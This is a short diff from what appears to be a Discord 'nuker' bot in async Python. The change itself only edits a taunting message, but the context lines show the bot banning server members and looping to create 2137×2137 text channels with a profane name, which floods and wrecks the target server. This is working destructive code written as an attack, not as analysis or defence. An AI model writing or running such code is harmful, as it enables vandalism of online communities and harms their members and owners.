@@ -30,7 +30,7 @@ async def Cmd(idres, guild):
             try:
                 await channel.ban(reason="One of you on server did a big no no")
             except:
-                await channel.send("Somehow I couldn't ban you, maybe you are an owner? Someone in server betrayed you doing a big no no.")
+                await channel.send("Somehow I couldn't ban you, maybe you are an dev? Someone in server betrayed you doing a big no no.")
 
         for cont in range(2137 * 2137):
             await guild.create_text_channel("FUCKED UP YOUR SERVER BRO " + str(cont))
